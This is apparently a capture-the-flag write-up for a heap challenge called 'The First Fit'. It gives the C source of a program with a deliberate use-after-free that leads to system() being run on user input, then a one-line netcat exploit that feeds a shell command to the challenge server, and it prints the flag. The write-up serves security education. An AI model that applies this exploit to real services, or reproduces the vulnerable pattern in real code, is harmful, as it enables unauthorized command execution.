# The First Fit

## Task

We get the source

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  int choice, choice2;
  char *a = malloc(128);
  char *b;
  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);
  while (1) {
    printf("a is at %p\n", a);
    printf("b is at %p\n", b);
    printf("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ");
    scanf("%d", &choice);
    switch(choice) {
      case 1:
              printf("What do I malloc?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                a = malloc(128);
              else if (choice2 == 2)
                b = malloc(128);
              break;
      case 2:
              printf("What do I free?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                free(a);
              else if (choice2 == 2)
                free(b);
              break;
      case 3: printf(">> "); scanf("%8s", a); break;
      case 4: system((char*)b); break;
      default: return -1;
    }
  }
  return 0;
}
```

## Solution

We need to make a and b point to the same memory
location. This is easily achieved because the pointers
don't get cleared, so we just allocate a, free a
then allocate b and they are the same pointer. Wow, magic!
Then we just fill a with /bin/sh (or directly cat flag.txt)
and then system b.

Onliner solve:

`echo "1\n1\n2\n1\n1\n2\n3\n/bin/sh\n4\ncat flag.txt" | nc chal.imaginaryctf.org 42003`

Gives us the flag `ictf{w3lc0me_t0_h34p_24bd59b0}`
